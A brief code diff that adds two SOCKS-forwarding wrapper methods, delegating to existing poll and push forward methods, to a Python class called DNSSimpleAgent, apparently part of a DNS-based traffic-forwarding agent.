@@ -37,6 +37,12 @@ class DNSSimpleAgent(LocalAgent):
 		self.forwardQueues = {}
 		self.xmitLock = threading.Lock()
 
+	def pollSocksForward(self, forwardID):
+		return self.pollForward(forwardID)
+        
+	def pushSocksForward(self, forwardID, data):
+		self.pushForward(forwardID, data)
+
 	def pollForward(self, forwardID):
 		if not forwardID in self.forwardQueues:
 			self.forwardQueues[forwardID] = queue.Queue()
